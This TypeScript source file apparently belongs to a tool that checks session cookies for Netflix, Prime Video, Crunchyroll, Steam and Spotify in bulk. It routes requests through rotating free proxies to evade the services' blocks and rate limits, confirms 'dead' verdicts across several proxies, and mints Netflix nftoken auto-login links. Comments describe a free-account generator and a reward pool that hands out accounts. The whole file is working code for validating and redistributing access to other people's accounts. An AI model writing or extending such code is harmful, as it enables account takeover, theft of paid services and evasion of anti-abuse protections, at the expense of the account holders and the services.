// Shared robust cookie-checking logic used by BOTH the public/admin bulk API
// route (app/api/check/route.ts) AND the background saved-recheck automation
// (lib/saved-recheck-job.ts). Keeping it in one place guarantees every checker —
// interactive or automated — gets the SAME accuracy guarantees:
//   • Proxy-failover: a 403/429/timeout/connect-error means THIS proxy's exit IP
//     is the problem, so we hop to a fresh proxy instead of trusting the result.
//   • Dead-confirmation quorum: a "dead" verdict from a single proxy can be a
//     FALSE dead (Netflix served a /login challenge to a flagged IP for a valid
//     cookie), so we require DEAD_CONFIRMATIONS independent proxies to agree
//     before reporting dead. Alive needs no confirmation (a logged-in account page
//     can't be faked by a proxy).
import { checkCookieNative, mintAuthLinks, PROXY_REQUEST_TIMEOUT_MS } from "@/lib/netflix-native"
import { checkPrimeCookieNative } from "@/lib/prime-native"
import { checkCrunchyrollCookieNative } from "@/lib/crunchyroll-native"
import { checkSteamCookieNative } from "@/lib/steam-native"
import { checkSpotifyCookieNative } from "@/lib/spotify-native"
import { isRetryable } from "@/lib/check-errors"
import type { CheckResult } from "@/lib/normalize-upstream"
import { type ProxyDialInfo } from "@/lib/proxies"
import { dispatcherForProxy } from "@/lib/proxy-dispatcher"
import { getServerLiveProxies } from "@/lib/server-live-proxies"
import type { Dispatcher } from "undici"

// Which streaming service a check targets. Both native checkers expose the SAME
// signature and return the SAME CheckResult/NativeError shape, so the entire
// proxy-failover + dead-confirmation pipeline below is service-agnostic — we just
// pick the right validator here.
export type Service = "netflix" | "prime" | "crunchyroll" | "steam" | "spotify"

// The subset of services that have a PUBLIC free-account generator + reward pool.
// Steam and Spotify are admin-only checkers (no public generator), so the reward,
// claim-limit, and pool subsystems are typed against this narrower set rather than
// the full checker `Service` union.
export type GeneratorService = "netflix" | "prime" | "crunchyroll"

function nativeCheckerFor(service: Service) {
  if (service === "prime") return checkPrimeCookieNative
  if (service === "crunchyroll") return checkCrunchyrollCookieNative
  if (service === "steam") return checkSteamCookieNative
  if (service === "spotify") return checkSpotifyCookieNative
  return checkCookieNative
}

// Retry policy for transient upstream failures on the DIRECT (non-failFast) path.
// Lowered 2 → 1: one retry still absorbs a transient blip, but we no longer spend
// up to 3 sequential upstream round-trips per cookie. This is a pure cost cut
// (fewer outbound requests + less Active-CPU/duration per invocation) — the bulk
// pool already re-queues anything still failing onto a fresh proxy.
const MAX_RETRIES = 1
const BASE_BACKOFF_MS = 300
const MAX_BACKOFF_MS = 2_500

// How many proxies a single cookie may hop through before giving up. Lowered
// 10 → 5 to bound worst-case fan-out (each hop is an outbound request, so this
// directly caps per-cookie CPU/duration cost). Still enough breadth to skip a few
// flagged (403/429) proxies and land on a clean one; anything beyond that is
// re-queued by the bulk run onto freshly-scraped exit IPs rather than hammered here.
export const MAX_PROXY_FALLBACKS = 5

// Independent proxies that must agree a cookie is dead before we trust it. Guards
// against proxy-induced false deads (e.g., a flagged IP getting served a /login
// challenge). Alive verdicts need no confirmation (you can't fake a logged-in page).
//
// OPTIMIZATION: when seeking confirmations, we SKIP proxies that are themselves
// blocked (403/429) since those can't reliably answer about the cookie. We only
// seek confirmations from proxies that successfully reached the service, reducing
// late-run overhead when many exits are flagged.
export const DEAD_CONFIRMATIONS = 2

function backoffDelay(attempt: number, retryAfterMs?: number): number {
  if (typeof retryAfterMs === "number") return Math.min(retryAfterMs, MAX_BACKOFF_MS * 2)
  const exp = Math.min(BASE_BACKOFF_MS * 2 ** attempt, MAX_BACKOFF_MS)
  return exp + Math.random() * BASE_BACKOFF_MS
}

function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms))
}

// Verifies a single cookie by talking to Netflix directly (optionally through a
// proxy dispatcher). Retries only transient failures (timeout / Netflix 5xx /
// rate limit); a definitive dead/alive verdict returns immediately. With
// `failFast`, transient failures return immediately (so the proxy pool can hop to
// the next working proxy instead of burning in-place backoff on one bad proxy).
export async function checkOne(
  cookie: string,
  opts: {
    includeRaw: boolean
    dispatcher?: Dispatcher
    includeLinks?: boolean
    failFast?: boolean
    timeoutMs?: number
    service?: Service
    // PRIME login-only liveness (distribution / claimed recheck) — ignored by the
    // other native checkers. See checkPrimeSessionAliveDirect / checkPrimeCookieNative.
    loginOnly?: boolean
  },
): Promise<CheckResult> {
  if (!cookie) return { valid: false, message: "No cookie provided.", errorCategory: "invalid_input" }

  const maxRetries = opts.failFast ? 0 : MAX_RETRIES
  let lastError: CheckResult = { valid: false, message: "Request failed.", errorCategory: "unknown" }
  const nativeCheck = nativeCheckerFor(opts.service ?? "netflix")

  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    const attemptResult = await nativeCheck(cookie, opts)
    if (!attemptResult.error || !isRetryable(attemptResult.error.errorCategory)) {
      return attemptResult.result
    }
    lastError = attemptResult.result
    if (attempt < maxRetries) {
      await sleep(backoffDelay(attempt, attemptResult.error.retryAfterMs))
    }
  }
  return lastError
}

// How many live proxies to try when a DIRECT Prime check comes back dead, before
// we believe that dead. Small cap keeps a single check / reward claim snappy.
const PRIME_CONFIRM_PROXY_ATTEMPTS = 4

// PRIME — direct check with (by default) proxy-confirmed dead verdicts.
//
// Amazon forces a sign-in bounce when a Prime session is hit from an IP far from where
// it normally lives (our US Vercel datacenter IP vs a FR/BR/IN/PH account), so a
// perfectly VALID foreign cookie can look DEAD when checked DIRECT even though the SAME
// cookie verifies ALIVE through a residential-ish proxy. So a direct dead is NOT trusted
// on its own: we re-check through a few live proxies and an ALIVE from any clean exit IP
// wins. Alive/transient direct results return immediately (no proxy work).
//
// `opts.noProxy` — REWARD DISTRIBUTION opt-out. The reward generator (browser + the
// extension pick routes) sets this to run DIRECT-ONLY, matching Netflix/Crunchyroll:
// it distributes from an already-proxy-verified saved pool and wants the hand-out to be
// FAST, so it deliberately skips the extra pool fetch + up to 4 sequential proxy hops
// per candidate. The single checker and claimed recheck keep the proxy-confirm default.
export async function checkPrimeDirectConfirmed(
  cookie: string,
  opts: { includeRaw: boolean; includeLinks?: boolean; timeoutMs?: number; noProxy?: boolean },
): Promise<{ result: CheckResult }> {
  const direct = await checkOne(cookie, { ...opts, service: "prime" })
  // Trust a direct ALIVE (a logged-in storefront can't be faked) and any transient
  // error (errorCategory) — only an AUTHORITATIVE dead would need proxy confirmation.
  if (direct.valid || direct.errorCategory) return { result: direct }
  // Reward distribution: DIRECT-ONLY, no proxy — return the direct verdict as-is.
  if (opts.noProxy) return { result: direct }

  try {
    const proxies = await getServerLiveProxies({ limit: 40 })
    for (const proxy of proxies.slice(0, PRIME_CONFIRM_PROXY_ATTEMPTS)) {
      const viaProxy = await checkOne(cookie, {
        ...opts,
        service: "prime",
        dispatcher: dispatcherForProxy(proxy),
        failFast: true,
      })
      // A clean ALIVE through a residential-ish exit IP → the cookie is good; the
      // direct "dead" was a geo/datacenter false negative.
      if (viaProxy.valid) return { result: viaProxy }
      // A clean DEAD through a proxy CONFIRMS the direct verdict → really dead.
      if (!viaProxy.errorCategory) return { result: direct }
      // Otherwise this proxy was blocked/timed out → try the next one.
    }
  } catch {
    // Proxy pool unavailable — fall back to the direct verdict (best effort).
  }
  return { result: direct }
}

// PRIME — HAND-OUT / CLAIMED-RECHECK liveness verifier. DIRECT, NO PROXY, LOGIN-ONLY.
//
// This is what the reward distributor (website + extension pick routes) and the
// claimed-account recheck use — NOT checkPrimeDirectConfirmed. The distinction:
//
//   • checkPrimeDirectConfirmed (single + bulk checker) INGESTS accounts. It must
//     POSITIVELY confirm active Prime (and will proxy-confirm a direct dead), so only
//     genuine active-Prime sessions ever enter the pool.
//   • checkPrimeSessionAliveDirect (distribution) HANDS OUT accounts already proven
//     to have active Prime at ingestion. It only needs to re-confirm the session is
//     still LOGGED IN — which is reliable DIRECT from any IP (the config API returns
//     the customerID regardless of geo). It runs NO proxy (matching the account
//     generator + extension "distributor doesn't use proxy" behaviour) so a claim is
//     FAST, and it does NOT re-demand Amazon's fragile storefront membership flag, so
//     a full pool of foreign accounts is no longer skipped/deleted into "no streamable
//     account available". An authoritative logged-out (expired cookie), an on-hold
//     membership, or a positive no-Prime flag still returns DEAD so stale rows purge.
export async function checkPrimeSessionAliveDirect(
  cookie: string,
  opts: { includeRaw: boolean },
): Promise<{ result: CheckResult }> {
  const result = await checkOne(cookie, { ...opts, service: "prime", loginOnly: true })
  return { result }
}

// How many live proxies to try when a DIRECT Netflix link-mint comes back empty.
const NETFLIX_LINK_PROXY_ATTEMPTS = 4

// NETFLIX ONLY — mints working nftoken auto-login links for a cookie, trying a
// DIRECT mint first (fast) and, if that yields nothing, RE-MINTING through the same
// live residential-ish proxy pool the bulk checker uses. This is the ONLY reliable
// way to get a *working* token off our infrastructure: Netflix's iOS FTL token host
// (ios.prod.ftl.netflix.com) is far more aggressively bot-blocked than the account
// page, so a bare serverless/datacenter IP frequently either gets refused OR is
// handed a token minted from a bot-flagged context that Netflix then REJECTS at
// redemption — the "link opens but doesn't log in / not a valid session" bug on the
// reward-callback + distributed/claimed accounts (which previously minted direct).
// Best-effort: returns undefined if neither path produces a token.
export async function mintNetflixLinksViaPool(cookie: string): Promise<CheckResult["links"]> {
  // 1) Direct attempt — cheapest, works when our IP isn't flagged for the FTL host.
  const direct = await mintAuthLinks(cookie).catch(() => undefined)
  if (direct && (direct.pc || direct.mobile || direct.tv)) return direct

  // 2) Proxy-assisted re-mint — issue the token from a clean residential-ish exit so
  //    Netflix accepts it at redemption. Same pool + attempt budget as the checker.
  try {
    const proxies = await getServerLiveProxies({ limit: 40 })
    for (const proxy of proxies.slice(0, NETFLIX_LINK_PROXY_ATTEMPTS)) {
      const links = await mintAuthLinks(cookie, dispatcherForProxy(proxy)).catch(() => undefined)
      if (links && (links.pc || links.mobile || links.tv)) return links
    }
  } catch {
    // Proxy pool unavailable — nothing more we can do (best effort).
  }
  return undefined
}

// ── DIRECT-ONLY nftoken MINT (NETFLIX ONLY) ─────────────────────────────────
// Mints a FRESH nftoken auto-login token over a DIRECT connection ONLY — NO proxy,
// ever, and NO caching. Every call hits Netflix and returns a brand-new token.
//
// This is the fix for the "reward link opens but doesn't log in / not a valid
// session" bug on the reward-callback + distributed/claimed accounts. The single
// checker mints its token DIRECT from our own server IP and those tokens reliably
// log in; the reward/claim path was instead minting through the rotating FREE-PROXY
// pool (mintNetflixLinksViaPool's fallback), and Netflix REJECTS a token minted
// from a flagged/rotating exit at redemption. So for distribution/claim/recheck we
// mint EXACTLY like the working single checker: direct, no proxy, always fresh.
//
// Best-effort: returns undefined if the direct mint produces nothing (the caller
// then keeps any previously stored links as a fallback).
//
// `freshLinks` controls the tiny dedupe cache below. Netflix's iOS FTL token host is
// aggressively bot-blocked, so re-hitting it on EVERY passive "your accounts" render
// invites refusals. We therefore cache the last direct-minted token per cookie for a
// short window and reuse it for passive renders (freshLinks=false). Every real CHECK
// or RECHECK — the reward hand-out/claim, the "your accounts" recheck button, and the
// distributed-account grant — passes freshLinks=true to BYPASS the cache and mint a
// brand-new nftoken, which is the user-facing guarantee that every recheck yields a
// fresh, valid auto-login link.
const DIRECT_MINT_TTL_MS = 90_000
const DIRECT_MINT_CACHE_MAX = 500
const directMintCache = new Map<string, { at: number; links: CheckResult["links"] }>()

export async function mintNetflixLinksDirect(
  cookie: string,
  freshLinks = false,
): Promise<CheckResult["links"]> {
  const now = Date.now()
  if (!freshLinks) {
    const hit = directMintCache.get(cookie)
    if (hit && now - hit.at < DIRECT_MINT_TTL_MS) return hit.links
  }
  const direct = await mintAuthLinks(cookie).catch(() => undefined)
  if (direct && (direct.pc || direct.mobile || direct.tv)) {
    directMintCache.set(cookie, { at: now, links: direct })
    // Bound the cache so it can't grow unbounded across many distinct cookies.
    if (directMintCache.size > DIRECT_MINT_CACHE_MAX) {
      const oldest = directMintCache.keys().next().value
      if (oldest !== undefined) directMintCache.delete(oldest)
    }
    return direct
  }
  return undefined
}

// NETFLIX ONLY — direct check, with proxy-assisted auth-link minting.
//
// A single Netflix check runs DIRECT from our serverless IP (no proxy) so it's fast
// and can't be false-deaded by a flaky exit IP. But Netflix's iOS FTL token host
// (which mints the nftoken auto-login links) is FAR more aggressively bot-blocked
// than the account page — a datacenter/serverless IP that reads the account page
// fine still routinely gets refused there. Result: the DIRECT check verifies ALIVE
// but `links` comes back empty, so "Copy full details" has no PC/Mobile/TV links.
// (The bulk checker doesn't hit this because it already runs through live proxies,
// which is why bulk copies include the links but single often doesn't.)
//
// Fix: when links were requested and the account is alive but the direct mint
// produced nothing, re-mint through a few live proxies (the same residential-ish
// pool the bulk checker uses) and attach the first successful set. Alive/dead
// verdicts are never affected — this only fills in missing links.
export async function checkNetflixWithLinks(
  cookie: string,
  opts: { includeRaw: boolean; includeLinks?: boolean; timeoutMs?: number },
): Promise<{ result: CheckResult; error?: unknown }> {
  const direct = await checkCookieNative(cookie, {
    includeRaw: opts.includeRaw,
    includeLinks: opts.includeLinks,
    timeoutMs: opts.timeoutMs,
  })
  // Only try to backfill when the caller asked for links, the account is alive, and
  // the direct mint didn't already produce them.
  const needsLinks = !!opts.includeLinks && direct.result.valid && !direct.result.links
  if (!needsLinks) return direct

  // Re-mint through the live proxy pool (shared helper) and attach without
  // disturbing the already-correct alive verdict/fields.
  const links = await mintNetflixLinksViaPool(cookie)
  if (links) return { ...direct, result: { ...direct.result, links } }
  return direct
}

// Anything meaning "THIS PROXY's exit IP is the problem" → fail over to a fresh
// proxy rather than trust the result. 403 (upstream_error) and 429 (rate_limited)
// are blocks/throttles of the PROXY, never a property of the cookie.
const isProxyProblem = (r: CheckResult) =>
  r.errorCategory === "upstream_unavailable" ||
  r.errorCategory === "timeout" ||
  r.errorCategory === "upstream_error" ||
  r.errorCategory === "rate_limited"

// A definitive DEAD verdict: Netflix answered cleanly and said the cookie is
// expired/invalid (no errorCategory, not valid).
const isDeadVerdict = (r: CheckResult) => !r.valid && !r.errorCategory

// Creates a checker bound to a proxy pool. The returned function checks one cookie
// at a time, sharing learned proxy health (dead / proven-good / trusted) across
// every call so the pool gets smarter over the course of a run/chunk.
export function createProxyPoolChecker(
  proxies: ProxyDialInfo[],
  opts?: { includeLinks?: boolean; service?: Service },
) {
  const includeLinks = opts?.includeLinks === true
  const service = opts?.service ?? "netflix"

  // Proxies that connection-failed / were blocked this run — skipped from then on.
  const deadIds = new Set<string>()
  // Proxies that returned a CLEAN Netflix response this run (reached Netflix),
  // preferred for fail-over.
  const goodIds: string[] = []
  const goodSet = new Set<string>()
  const markGood = (id: string) => {
    if (!goodSet.has(id)) {
      goodSet.add(id)
      goodIds.push(id)
    }
  }
  // Proxies that returned a genuine ALIVE account page — fully trusted, so their
  // later "dead" verdicts need only a single confirmation.
  const trustedIds = new Set<string>()
  const byId = new Map(proxies.map((p) => [p.id, p] as const))

  // Routes one cookie through the pool with fail-over + dead-confirmation quorum.
  // `rrIndex` drives the round-robin primary pick so load spreads across exit IPs.
  return async function checkViaProxy(cookie: string, rrIndex: number): Promise<CheckResult> {
    if (proxies.length === 0) {
      return { valid: false, message: "No proxy available.", errorCategory: "upstream_unavailable" }
    }
    const seen = new Set<string>()
    const candidates: ProxyDialInfo[] = []
    const tryAdd = (p: ProxyDialInfo | undefined) => {
      if (!p || seen.has(p.id) || deadIds.has(p.id) || candidates.length >= MAX_PROXY_FALLBACKS) return
      candidates.push(p)
      seen.add(p.id)
    }
    tryAdd(proxies[rrIndex % proxies.length]) // round-robin primary
    // Proven-good fail-over, MOST-RECENTLY-confirmed first: the instant the primary
    // fails, hop straight to the LATEST proxy we just saw reach Netflix cleanly
    // (free proxies decay fast, so the freshest "good" is the most likely to still
    // be working) instead of an older one that may have since gone bad.
    for (let k = goodIds.length - 1; k >= 0; k--) tryAdd(byId.get(goodIds[k]))
    for (const p of proxies) tryAdd(p) // remaining pool, fastest-first

    let firstDead: CheckResult | undefined
    let deadAgreements = 0
    let deadNeeded = DEAD_CONFIRMATIONS
    for (const proxy of candidates) {
      const r = await checkOne(cookie, {
        includeRaw: false,
        includeLinks,
        service,
        dispatcher: dispatcherForProxy(proxy),
        failFast: true,
        timeoutMs: PROXY_REQUEST_TIMEOUT_MS,
      })
      if (isProxyProblem(r)) {
        deadIds.add(proxy.id) // blacklist this proxy for the rest of the run
        // OPTIMIZATION: don't spin through more dead proxies once we have at least
        // one confirmed dead from a trusted exit. A second 403/429 can't teach us
        // anything and just burns latency (especially late-run when many exits are flagged).
        if (deadAgreements >= deadNeeded) break
        continue
      }
      deadIds.delete(proxy.id)
      markGood(proxy.id)

      if (!isDeadVerdict(r)) {
        if (r.valid) trustedIds.add(proxy.id)
        return r // ALIVE (or non-dead) → trust immediately
      }

      if (trustedIds.has(proxy.id)) deadNeeded = 1
      firstDead = firstDead ?? r
      deadAgreements++
      if (deadAgreements >= deadNeeded) return firstDead // confirmed dead
    }

    // Ran out of proxies without a confirmable verdict → report a RETRYABLE
    // transient (never a raw 403 or an unconfirmed dead), so the caller retries
    // rather than recording a false error or a false dead.
    return {
      valid: false,
      message: firstDead
        ? "Undetermined — couldn't confirm across proxies. Will retry."
        : "All proxies blocked/unreachable — will retry on fresh proxies.",
      errorCategory: "upstream_unavailable",
    }
  }
}
